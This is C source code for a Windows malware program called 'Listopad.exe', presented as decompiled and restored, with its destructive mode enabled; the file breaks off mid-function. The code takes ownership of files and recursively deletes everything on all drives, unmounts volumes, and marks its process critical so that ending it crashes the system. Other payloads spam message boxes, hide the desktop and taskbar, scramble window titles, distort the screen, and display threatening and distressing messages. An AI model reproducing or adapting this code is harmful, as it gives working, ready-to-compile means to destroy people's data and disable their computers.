/*
 * Listopad.exe (or Listpad) ( The most average malware ) Decompiled!
 * Decompiled and restored by Xidroria and Sapphire
 * 
 * Used as a base ( Just like in actual Listopad ):
 * https://github.com/whypet/Monoxide
 */

/*
 * To enable destructive stuff, put:
 * #define Unsafe
 * In the start of this file.
 * 
 * Compile with UNICODE Character Set
 * Change architecture to x64 and put:
 * #define Archx64
 * To make it running the Critical Process Thread
 */

#define Unsafe

#include <Windows.h>

#include <AclAPI.h>
#include <math.h>

#include "/Development/C/Listopad/resource.h"

#pragma comment( lib, "Msimg32.lib" )
#pragma comment( lib, "WinMM.lib" )

#define NUM_ACES 2

#define PI 3.141592f

HCRYPTPROV _hCryptProv;

typedef union tag_RGBQUAD
{
	COLORREF rgb;

	struct
	{
		BYTE r, g, b;
		BYTE reserved;
	};
} _RGBQUAD, *PRGBQUAD;

typedef struct tagHSLCOLOR
{
	FLOAT h, s, l;
} HSLCOLOR, *PHSLCOLOR;

HSLCOLOR
RGBToHSL(
	_In_ _RGBQUAD rgb
)
{
	HSLCOLOR hsl;

	BYTE r = rgb.r, g = rgb.g, b = rgb.b;

	FLOAT _r = ( FLOAT )r / 255.f,
		_g = ( FLOAT )g / 255.f,
		_b = ( FLOAT )b / 255.f;

	FLOAT rgbMin = min( min( _r, _g ), _b ),
		rgbMax = max( max( _r, _g ), _b );

	FLOAT fDelta = rgbMax - rgbMin,
		deltaR, deltaG, deltaB;

	FLOAT h = 0.0f, s = 0.0f,
		l = ( FLOAT )( ( rgbMax + rgbMin ) / 2.f );

	if ( fDelta != 0.0f )
	{
		s = ( l < .5f ) ? ( FLOAT )( fDelta / ( rgbMax + rgbMin ) ) : ( FLOAT )( fDelta / ( 2.f - rgbMax - rgbMin ) );

		deltaR = ( FLOAT )( ( ( rgbMax - _r ) / 6.f + ( fDelta / 2.f ) ) / fDelta );
		deltaG = ( FLOAT )( ( ( rgbMax - _g ) / 6.f + ( fDelta / 2.f ) ) / fDelta );
		deltaB = ( FLOAT )( ( ( rgbMax - _b ) / 6.f + ( fDelta / 2.f ) ) / fDelta );

		if ( _r == rgbMax )
			h = deltaB - deltaG;
		else if ( _g == rgbMax )
			h = ( 1.f / 3.f ) + deltaR - deltaB;
		else if ( _b == rgbMax )
			h = ( 2.f / 3.f ) + deltaG - deltaR;

		if ( h < 0.0f )
			h += 1.f;
		if ( h > 1.f )
			h -= 1.f;
	}

	hsl.h = h;
	hsl.s = s;
	hsl.l = l;

	return hsl;
}

_RGBQUAD
HSLToRGB(
	_In_ HSLCOLOR hsl
)
{
	_RGBQUAD rgb;

	FLOAT r = hsl.l, g = hsl.l, b = hsl.l,
		h = hsl.h, s = hsl.s, l = hsl.l;

	FLOAT v = ( l <= .5f ) ? ( l * ( 1.f + s ) ) : ( l + s - l * s );

	FLOAT m, sv, fract, vsf, mid1, mid2;
	INT sextant;

	if ( v > 0.0f )
	{
		m = l * 2.f - v, sv = ( v - m ) / v;

		h *= 6.f, sextant = ( INT )h;

		fract = h - sextant, vsf = v * sv * fract;
		mid1 = m + vsf, mid2 = v - vsf;

		switch ( sextant )
		{
		case 0:
			r = v, g = mid1, b = m;
			break;
		case 1:
			r = mid2, g = v, b = m;
			break;
		case 2:
			r = m, g = v, b = mid1;
			break;
		case 3:
			r = m, g = mid2, b = v;
			break;
		case 4:
			r = mid1, g = m, b = v;
			break;
		case 5:
			r = v, g = m, b = mid2;
			break;
		}
	}

	rgb.r = ( BYTE )( r * 255.f );
	rgb.g = ( BYTE )( g * 255.f );
	rgb.b = ( BYTE )( b * 255.f );

	return rgb;
}

INT
Random( VOID )
{
	if ( !_hCryptProv )
		if ( !CryptAcquireContext( &_hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT ) )
			ExitProcess( EXIT_FAILURE );

	INT iOut;
	CryptGenRandom( _hCryptProv, sizeof( iOut ), &iOut );

	return iOut & 0x7FFFFFFF;
}

DWORD
WINAPI
Unmount(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	LPCWSTR lpDisks[ 25 ] =
	{
		TEXT( "A:\\" ), TEXT( "B:\\" ), TEXT( "D:\\" ),
		TEXT( "E:\\" ), TEXT( "F:\\" ), TEXT( "G:\\" ),
		TEXT( "H:\\" ), TEXT( "I:\\" ), TEXT( "J:\\" ),
		TEXT( "K:\\" ), TEXT( "L:\\" ), TEXT( "M:\\" ),
		TEXT( "N:\\" ), TEXT( "O:\\" ), TEXT( "P:\\" ),
		TEXT( "Q:\\" ), TEXT( "R:\\" ), TEXT( "S:\\" ),
		TEXT( "T:\\" ), TEXT( "U:\\" ), TEXT( "V:\\" ),
		TEXT( "W:\\" ), TEXT( "X:\\" ), TEXT( "Y:\\" ),
		TEXT( "Z:\\" )
	};

	for ( INT i = 0; i < _countof( lpDisks ); i++ )
		DeleteVolumeMountPoint( lpDisks[ i ] );
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE			hToken,
	_In_ LPCWSTR		lpPrivilege,
	_In_ BOOL			bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp = { 0 };
	LUID luid = { 0 };

	if ( !LookupPrivilegeValue( NULL, lpPrivilege, &luid ) )
		return FALSE;

	tp.PrivilegeCount				= 1;
	tp.Privileges[ 0 ].Luid			= luid;

	if ( bEnablePrivilege )
		tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[ 0 ].Attributes = 0;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( tp ), NULL, NULL ) )
		return FALSE;

	if ( GetLastError( ) == ERROR_NOT_ALL_ASSIGNED )
		return FALSE;

	return TRUE;
}

BOOL
WINAPI
TakeOwnership(
	_In_ LPWSTR lpFile
)
{
	BOOL bRetval = FALSE;
	HANDLE hToken = NULL;

	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;

	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[ NUM_ACES ] = { 0 };

	DWORD dwRes;

	if ( !AllocateAndInitializeSid( &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone ) )
		goto Cleanup;

	if ( !AllocateAndInitializeSid( &SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin ) )
		goto Cleanup;

	ea[ 0 ].grfAccessPermissions			= GENERIC_ALL;
	ea[ 0 ].grfAccessMode					= SET_ACCESS;
	ea[ 0 ].grfInheritance					= NO_INHERITANCE;
	ea[ 0 ].Trustee.TrusteeForm				= TRUSTEE_IS_SID;
	ea[ 0 ].Trustee.TrusteeType				= TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[ 0 ].Trustee.ptstrName				= pSIDEveryone;

	ea[ 1 ].grfAccessPermissions			= GENERIC_ALL;
	ea[ 1 ].grfAccessMode					= SET_ACCESS;
	ea[ 1 ].grfInheritance					= NO_INHERITANCE;
	ea[ 1 ].Trustee.TrusteeForm				= TRUSTEE_IS_SID;
	ea[ 1 ].Trustee.TrusteeType				= TRUSTEE_IS_GROUP;
	ea[ 1 ].Trustee.ptstrName				= pSIDAdmin;

	if ( SetEntriesInAcl( NUM_ACES, ea, NULL, &pACL ) != ERROR_SUCCESS )
		goto Cleanup;

	dwRes = SetNamedSecurityInfo( lpFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL );

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
		goto Cleanup;
	}

	if ( dwRes != ERROR_ACCESS_DENIED )
		goto Cleanup;

	if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
		goto Cleanup;

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, TRUE ) )
		goto Cleanup;

	dwRes = SetNamedSecurityInfo( lpFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL );

	if ( dwRes != ERROR_SUCCESS )
		goto Cleanup;

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, FALSE ) )
		goto Cleanup;

	dwRes = SetNamedSecurityInfo( lpFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL ); 

	if ( dwRes == ERROR_SUCCESS )
		bRetval = TRUE;

Cleanup:
	if ( pSIDAdmin )
		FreeSid( pSIDAdmin );
	if ( pSIDEveryone )
		FreeSid( pSIDEveryone );
	if ( pACL )
		LocalFree( pACL );
	if ( hToken )
		CloseHandle( hToken );

	return bRetval;
}

BOOL
WINAPI
FileMess(
	_In_ LPWSTR lpDirectory
)
{
	TakeOwnership( lpDirectory );

	WCHAR wchSearchDir[ MAX_PATH ] = { 0 };
	lstrcpy( wchSearchDir, lpDirectory );
	lstrcat( wchSearchDir, TEXT( "*.*" ) );

	WIN32_FIND_DATA findData;
	HANDLE hSearch = FindFirstFile( wchSearchDir, &findData );

	if ( hSearch == INVALID_HANDLE_VALUE )
		return FALSE;
	else do
	{
		if ( !lstrcmp( findData.cFileName, TEXT( "." ) ) || !lstrcmp( findData.cFileName, TEXT( ".." ) ) ||
			findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT )
			continue;

		WCHAR wchPath[ MAX_PATH ] = { 0 };
		lstrcpy( wchPath, lpDirectory );
		lstrcat( wchPath, findData.cFileName );

		TakeOwnership( wchPath );

		if ( findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
		{
			lstrcat( wchPath, TEXT( "\\" ) );
			FileMess( wchPath );

			RemoveDirectory( wchPath );
		}
		else
			DeleteFile( wchPath );
	}
	while ( FindNextFile( hSearch, &findData ) );

	RemoveDirectory( lpDirectory );
	FindClose( hSearch );

	return TRUE;
}

VOID
WINAPI
DriveMess( VOID )
{
	WCHAR wchTempDrives[ 512 ] = { 0 };
	DWORD dwLength = GetLogicalDriveStrings( 512, wchTempDrives );

	CloseHandle( CreateThread( NULL, 0, FileMess, wchTempDrives, 0, NULL ) );

	for ( DWORD i = 0; i < dwLength; i++ )
		if ( !wchTempDrives[ i ] )
			CloseHandle( CreateThread( NULL, 0, FileMess, wchTempDrives + ( i + 1 ) * sizeof( WCHAR ), 0, NULL ) );
}

BOOL
WINAPI
EnablePrivilege(
	_In_ LPCWSTR lpPrivilege
)
{
	HANDLE hToken;
	LUID Luid;
	TOKEN_PRIVILEGES tp = { 0 };
	BOOL bRet;

	if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		return FALSE;

	if ( !LookupPrivilegeValue( NULL, lpPrivilege, &Luid ) )
	{
		CloseHandle( hToken );
		return FALSE;
	}

	tp.PrivilegeCount = 1;

	tp.Privileges[ 0 ].Luid					= Luid;
	tp.Privileges[ 0 ].Attributes			= SE_PRIVILEGE_ENABLED;

	bRet = AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( tp ), NULL, NULL );
	CloseHandle( hToken );

	return bRet;
}

BOOL
WINAPI
ProcessIsCritical( VOID )
{
	typedef VOID( WINAPI * RtlSetProcessIsCritical )(
		_In_		BOOLEAN			NewValue,
		_Out_		PBOOLEAN		OldValue,
		_In_		BOOLEAN			IsWinlogon );

	HMODULE hNTDLL;
	RtlSetProcessIsCritical fpRtlSetProcessIsCritical;

	hNTDLL = LoadLibrary( TEXT( "ntdll.dll" ) );

	if ( !hNTDLL )
		return FALSE;

	EnablePrivilege( SE_DEBUG_NAME );

	fpRtlSetProcessIsCritical = ( RtlSetProcessIsCritical )GetProcAddress( hNTDLL, "RtlSetProcessIsCritical" );

	if ( !fpRtlSetProcessIsCritical )
	{
		FreeLibrary( hNTDLL );
		return FALSE;
	}

	fpRtlSetProcessIsCritical( TRUE, NULL, FALSE );

	FreeLibrary( hNTDLL );

	return TRUE;
}

VOID
WINAPI
RegistryAdd(
	_In_ HKEY hkHive,
	_In_ LPCWSTR SubKey,
	_In_ LPCWSTR ValueName,
	_In_ DWORD Type,
	_In_ INT Value
)
{
	HKEY hKey;
	DWORD dwDisposition;

	RegCreateKeyEx( hkHive, SubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition );
	RegSetValueEx( hKey, ValueName, 0, Type, &Value, sizeof( Value ) );

	RegCloseKey( hKey );
}

DWORD
WINAPI
RandomMessageBox(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	LPCWSTR lpMessage = TEXT( "Shucks subscribe!!!!!!!!! Green screen" );

	while ( TRUE )
	{
		DWORD dwType = 0;

		dwType += Random( ) % 7;
		dwType += ( Random( ) % 5 ) << 4;

		MessageBox( HWND_DESKTOP, lpMessage, TEXT( "ListopadNovember.exe" ), dwType );

		BOOL bRandom = ( BOOL )( Random( ) % 7 );

		switch ( bRandom )
		{
		case 0:
			lpMessage = TEXT( "It's krima!!!" );
			break;
		case 1:
			lpMessage = TEXT( "My damn TV won't turn on..." );
			break;
		case 2:
			lpMessage = TEXT( "Credits to VenraTech for the payload, but I edited it.\nCredits to VenraTech for the square/triangle wave!\n\nCredits to VenraTech for this payload, but I modified it\nCredits to sixtyfourYT for this payload, but I modified it\n\n- All from UltraDasher965" );
			break;
		case 3:
			lpMessage = TEXT( "jerry's bait shop vs watchman of doom, who wins - sixtyfour64" );
			break;
		case 4:
			lpMessage = TEXT( "I also know where you live\n(Address Here)\n\nHave fun trying to sleep :)" );
			break;
		case 5:
			lpMessage = TEXT( "venra is probably skidding purgatorium atm - CiberBoy" );
			break;
		case 6:
			lpMessage = TEXT( "Windows 7 Kills Snow Leopard - Gizmodo 2009" );
			break;
		}
	}
}

DWORD
WINAPI
HideDesktop(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	LPCWSTR lpWindows[ 2 ] =
	{
		TEXT( "Progman" ), TEXT( "Shell_TrayWnd" )
	};

	for ( INT i = 0; i < _countof( lpWindows ); i++ )
	{
		HWND hWnd = FindWindow( lpWindows[ i ], NULL );
		ShowWindow( hWnd, SW_HIDE );
	}
}

BOOL
CALLBACK
EnumWnd(
	_In_ HWND hwnd,
	_In_ LPARAM lParam
)
{
	INT iLength = Random( ) % 100 + 100;
	SIZE_T nSize = ( iLength + 1 ) * sizeof( WCHAR );

	HANDLE hHeap = GetProcessHeap( );
	LPWSTR wchText = HeapAlloc( hHeap, HEAP_ZERO_MEMORY, nSize );

	for ( INT i = 0; i < iLength; i++ )
		wchText[ i ] = Random( ) % 26 + 65;

	wchText[ iLength ] = TEXT( '\0' );

	SendMessageTimeoutW( hwnd, WM_SETTEXT, 0, wchText, SMTO_ABORTIFHUNG, 100, NULL );

	HeapFree( hHeap, 0, wchText );

	return TRUE;
}

DWORD
WINAPI
WindowMess(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	while ( TRUE )
	{
		EnumChildWindows( GetDesktopWindow( ), EnumWnd, 0 );
		Sleep( 100 );
	}
}

BOOL
CALLBACK
GlobalEnumWnd(
	_In_ HWND hwnd,
	_In_ LPARAM lParam
)
{
	if ( IsWindowVisible( hwnd ) && !IsIconic( hwnd ) )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		SetWindowPos( hwnd, HWND_TOP, Random( ) % w, Random( ) % h,
			Random( ) % ( w / 2 ) + 100, Random( ) % ( h / 2 ) + 100, SWP_NOREDRAW | SWP_NOACTIVATE );

		Sleep( 2'000 );
	}

	return TRUE;
}

DWORD
WINAPI
WindowMove(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	while ( TRUE )
	{
		EnumWindows( GlobalEnumWnd, 0 );
		Sleep( 2'000 );
	}
}

LRESULT
CALLBACK
MessageBoxHook(
	_In_ INT nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if ( nCode == HCBT_CREATEWND )
	{
		CREATESTRUCT* pCreateStruct = ( ( CBT_CREATEWND* )lParam )->lpcs;

		if ( ( pCreateStruct->style & WS_DLGFRAME ) ||
			( pCreateStruct->style & WS_POPUP ) ) {
			HWND hwnd = ( HWND )wParam;

			INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
				h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

			pCreateStruct->x = Random( ) % ( w - pCreateStruct->cx );
			pCreateStruct->y = Random( ) % ( h - pCreateStruct->cy );
		}
	}

	return CallNextHookEx( NULL, nCode, wParam, lParam );
}

DWORD
WINAPI
MessageBoxThread(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	HHOOK hHook = SetWindowsHookEx( WH_CBT, MessageBoxHook, NULL, GetCurrentThreadId( ) );

	MessageBox( HWND_DESKTOP, TEXT( "HELP ME\nI'M BLEEDING" ), TEXT( "Windows" ), 0x1030u );

	UnhookWindowsHookEx( hHook );
}

DWORD
WINAPI
RandomMessageBoxes(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	while ( TRUE )
	{
		CloseHandle( CreateThread( NULL, 0, MessageBoxThread, NULL, 0, NULL ) );
		Sleep( 100 );
	}
}

typedef struct tagVERTEX
{
	FLOAT x, y, z;
} VERTEX, *PVERTEX;

VERTEX
RotateVertex(
	_Inout_ VERTEX vtx,
	_In_ FLOAT ax,
	_In_ FLOAT ay,
	_In_ FLOAT az
)
{
	FLOAT cx = cosf( ax ), sx = tanf( ax );
	FLOAT cy = cosf( ay ), sy = sinf( ay );
	FLOAT cz = cosf( az ), sz = tanf( az );

	FLOAT y = vtx.y * cx - vtx.z * sx;
	FLOAT z = vtx.y * sx + vtx.z * cx;
	vtx.y = y;
	vtx.z = z;

	FLOAT x = vtx.x * cy + vtx.z * sy;
	z = -vtx.x * sy + vtx.z * cy;
	vtx.x = x;
	vtx.z = z;

	x = vtx.x * cz - vtx.y * sz;
	y = vtx.x * sz + vtx.y * cz;
	vtx.x = x;
	vtx.y = y;

	return vtx;
}

VOID
WINAPI
DrawShape(
	_In_ HDC dc,
	_In_ VERTEX vtx,
	_In_ FLOAT sz,
	_In_ FLOAT ax,
	_In_ FLOAT ay,
	_In_ FLOAT az
)
{
	VERTEX vtcs[ 8 ] =
	{
		{ -sz, -sz, -sz },
		{  sz, -sz, -sz },
		{  sz,  sz, -sz },
		{ -sz,  sz, -sz },
		{ -sz, -sz,  sz },
		{  sz, -sz,  sz },
		{  sz,  sz,  sz },
		{ -sz,  sz,  sz },
	};

	for ( INT i = 0; i < 8; i++ )
	{
		VERTEX vtxRotated = RotateVertex( vtcs[ i ], ax, ay, az );

		INT xPos = ( INT )( vtx.x + vtxRotated.x ),
			yPos = ( INT )( vtx.y + vtxRotated.y );

		HINSTANCE hModHandle = GetModuleHandle( NULL );
		HICON hIcon = LoadIcon( hModHandle, MAKEINTRESOURCE( IDI_ICON1 ) );

		DrawIconEx( dc, xPos - 20, yPos - 20, hIcon, 50, 50, 0, NULL, DI_NORMAL );

		DestroyIcon( hIcon );
	}
}

DWORD
WINAPI
RenderCube(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	FLOAT ax = 0.0f, ay = 0.0f, az = 0.0f;

	INT sx = 2;
	INT sy = 2;

	FLOAT xPos = 100,
		yPos = 100;

	FLOAT sz = 100.f;

	while ( TRUE )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		INT lpsx = GetDeviceCaps( hdcDesk, LOGPIXELSX ),
			lpsy = GetDeviceCaps( hdcDesk, LOGPIXELSY );

		INT xCoord = w * lpsx / 96,
			yCoord = h * lpsy / 96;

		xPos += sx;
		yPos += sy;

		if ( xPos + 75 >= xCoord )
		{
			sx = -1;
			xPos = xCoord - 76;
		}
		else if ( xPos <= 75 )
		{
			sx = 1;
			xPos = 76;
		}

		if ( yPos + 75 >= yCoord )
		{
			sy = -1;
			yPos = yCoord - 76;
		}
		else if ( yPos <= 75 )
		{
			sy = 1;
			yPos = 76;
		}

		VERTEX vtx = { xPos, yPos, 0.0f };
		DrawShape( hdcDesk, vtx, sz, ax, ay, az );

		ax += 1.f / 100.f;
		ay += 1.f / 100.f;
		az += 1.f / 100.f;

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		if ( sz >= 0 && sz <= 100 )
			sz += 1.f / 2.f;

		Sleep( 10 );
	}
}

COLORREF
HueShift(
	_In_ INT Shift
)
{
	static INT siStage = 0;
	static INT r = 0, g = 0, b = 0;

	switch ( siStage )
	{
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += Shift : siStage++;

		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= Shift : siStage++;

		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += Shift : siStage++;

		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= Shift : siStage++;

		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += Shift : siStage++;

		break;
	case 5:
		r = 255;
		g = 0;

		siStage = 0;
		b > 0 ? b -= Shift : siStage;

		break;
	}

	COLORREF crResult = RGB( r, g, b );
	return crResult;
}

DWORD
WINAPI
Texts(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	LPCWSTR lpTexts[ 6 ] =
	{
		TEXT( "Intrusive thoughts got the best of me." ),
		TEXT( "I AM IN DANGER... PLEASE FUCKING HELP" ),
		TEXT( "Vanishing away from the earth forever." ),
		TEXT( "Sinking to the ground with my feelings." ),
		TEXT( "I feel like I am in danger." ),
		TEXT( "Mentally ill" )
	};

	for ( INT t = 0; ; t++ )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		HFONT hFont = CreateFont( Random( ) % 32 + 64, 0, Random( ) % 64, 0, FW_MEDIUM, FALSE, TRUE, FALSE, OEM_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, TEXT( "Times New Roman" ) );

		SelectObject( hdcDesk, hFont );

		SetBkColor( hdcDesk, RGB( t + 1, t + 1, t + 1 ) );
		SetTextColor( hdcDesk, HueShift( 3 ) );

		for ( INT i = 0; i < _countof( lpTexts ); i++ )
		{
			LPCWSTR lpText = lpTexts[ i ];

			INT xPosition = Random( ) % w,
				yPosition = Random( ) % h;

			TextOutW( hdcDesk, xPosition, yPosition, lpText, lstrlen( lpText ) );
		}

		DeleteObject( hFont );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		Sleep( 100 );
	}
}

DWORD
WINAPI
DarkBright(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	while ( TRUE )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		HDC hdcTemp = CreateCompatibleDC( hdcDesk );
		HBITMAP hbm = CreateCompatibleBitmap( hdcDesk, w, h );

		SelectObject( hdcTemp, hbm );

		BitBlt( hdcTemp, 0, 0, w, h, hdcDesk, 0, 0, SRCCOPY );

		for ( INT i = 0; i < 10; i++ )
		{
			INT xPosition = Random( ) % w,
				yPosition = Random( ) % h;

			BitBlt( hdcTemp, xPosition, Random( ) % 15,
				w - xPosition, h, hdcTemp, xPosition, Random( ) % 15, SRCPAINT );

			BitBlt( hdcTemp, Random( ) % 15, yPosition,
				w, h - yPosition, hdcTemp, Random( ) % 15, yPosition, SRCAND );
		}

		BitBlt( hdcDesk, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		Sleep( 10 );
	}
}

DWORD
WINAPI
GdiPayload1(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	for ( INT t = 0; ; t++ )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		/*		Bwiswexual! OwO - Sapphire, 7 / 12 / 2026		*/
		BITMAPINFO biSexual = { 0 };

		biSexual.bmiHeader.biSize				= sizeof( biSexual );
		biSexual.bmiHeader.biWidth				= w;
		biSexual.bmiHeader.biHeight				= h;
		biSexual.bmiHeader.biPlanes				= 1;
		biSexual.bmiHeader.biBitCount			= 32;

		PRGBQUAD prgbDst;

		HDC hdcTemp = CreateCompatibleDC( hdcDesk );
		HBITMAP hbm = CreateDIBSection( hdcDesk, &biSexual, DIB_RGB_COLORS, &prgbDst, NULL, 0 );

		SelectObject( hdcTemp, hbm );

		BitBlt( hdcTemp, 0, 0, w, h, hdcDesk, 0, 0, SRCCOPY );

		for ( INT y = 0; y < h; y++ )
			for ( INT x = 0; x < w; x++ )
			{
				_RGBQUAD rgbDst = prgbDst[ y * w + x ];

				HSLCOLOR hsl = RGBToHSL( rgbDst );

				/* Weird formula... */
				INT iFormula = ( t ^ 4 ) + ( t * 4 ) / ( ( t / 16 ) % ( ( y ^ x ) + 1 ) + ( y * x ) + 1);

				hsl.h = fmodf( ( FLOAT )iFormula / 100000.f + hsl.h + .09f, 1.f );
				hsl.s = 1.f;

				if ( hsl.l < .4f )
					hsl.l += .2f;

				rgbDst = HSLToRGB( hsl );
				prgbDst[ y * w + x ] = rgbDst;
			}

		BitBlt( hdcDesk, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY );

		DeleteObject( hbm );
		DeleteDC( hdcTemp );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		Sleep( 1 );
	}
}

DWORD
WINAPI
GdiPayload2(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	BLENDFUNCTION blf = { AC_SRC_OVER, 0, 100, 0 };

	for ( INT t = 0; ; t++ )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		/*		Bwiswexual! OwO - Sapphire, 7 / 12 / 2026		*/
		BITMAPINFO biSexual = { 0 };

		biSexual.bmiHeader.biSize				= sizeof( biSexual );
		biSexual.bmiHeader.biWidth				= w;
		biSexual.bmiHeader.biHeight				= h;
		biSexual.bmiHeader.biPlanes				= 1;
		biSexual.bmiHeader.biBitCount			= 32;

		PRGBQUAD prgbDst;

		HDC hdcTemp = CreateCompatibleDC( hdcDesk );
		HBITMAP hbm = CreateDIBSection( hdcDesk, &biSexual, DIB_RGB_COLORS, &prgbDst, NULL, 0 );

		SelectObject( hdcTemp, hbm );

		BitBlt( hdcTemp, 0, 0, w, h, hdcDesk, 0, 0, SRCCOPY );

		for ( INT y = 0; y < h; y++ )
			for ( INT x = 0; x < w; x++ )
			{
				_RGBQUAD rgbDst = prgbDst[ y * w + x ];
				rgbDst.r -= 31, rgbDst.g -= 31, rgbDst.b -= 31;

				prgbDst[ y * w + x ] = rgbDst;
			}

		AlphaBlend( hdcDesk, 0, 0, w, h, hdcTemp, 0, 0, w, h, blf );

		DeleteObject( hbm );
		DeleteDC( hdcTemp );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		Sleep( 1 );
	}
}

DWORD
WINAPI
ExtraGdiPayload2(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	WNDCLASS wc = { 0 };

	HMODULE hmodHandle = GetModuleHandle( NULL );

	INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
		h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

	HDC hdcDesk = GetDC( HWND_DESKTOP );

	HDC hdcTemp = CreateCompatibleDC( hdcDesk );
	HBITMAP hbm = CreateCompatibleBitmap( hdcDesk, w, h );

	SelectObject( hdcTemp, hbm );

	wc.lpfnWndProc				= DefWindowProc;
	wc.hInstance				= hmodHandle;
	wc.lpszClassName			= TEXT( "class" );

	RegisterClass( &wc );

	HWND hwndLayered = CreateWindowEx( WS_EX_TOOLWINDOW | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST, wc.lpszClassName, TEXT( "window" ), WS_POPUP, 0, 0, w, h, HWND_DESKTOP, NULL, hmodHandle, NULL );
	ShowWindow( hwndLayered, SW_SHOW );

	MSG Msg = { 0 };

	while ( Msg.message != WM_QUIT )
	{
		if ( PeekMessage( &Msg, HWND_DESKTOP, 0, 0, PM_REMOVE ) )
		{
			TranslateMessage( &Msg );
			DispatchMessage( &Msg );
		}

		HDC hdcWnd = GetDC( HWND_DESKTOP );

		BitBlt( hdcWnd, 0, 0, w, h, hdcWnd, 0, 0, SRCCOPY );
		BitBlt( hdcTemp, Random( ) % 10, Random( ) % 10, w, h, hdcWnd, Random( ) % 10, Random( ) % 10, SRCCOPY );

		POINT ptWnd = { 0, 0 };
